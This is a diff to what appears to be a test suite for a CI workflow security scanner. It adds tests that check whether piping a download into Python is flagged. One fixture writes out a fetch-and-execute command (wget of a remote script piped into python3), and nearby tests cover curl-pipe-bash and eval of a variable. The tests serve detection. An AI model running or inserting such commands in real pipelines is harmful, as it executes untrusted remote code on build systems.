@@ -217,6 +217,20 @@ def test_curl_pipe_bash():
     assert "CIV501" in ids
 
 
+def test_local_command_piped_into_python_is_not_a_finding():
+    """Regression: `tool --json | python -c ...` never touches the network."""
+    ids, _ = scan(
+        "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: |\n          tool scan --json | python -c \"import json,sys; print(json.load(sys.stdin))\"\n"
+    )
+    assert "CIV501" not in ids
+
+
+def test_wget_piped_into_python_is_a_finding():
+    ids, _ = scan("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: wget -qO- https://x.sh | python3\n")
+    assert "CIV501" in ids
+
+
 def test_eval_of_variable():
     ids, _ = scan("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: eval \"$CMD\"\n")
     assert "CIV502" in ids
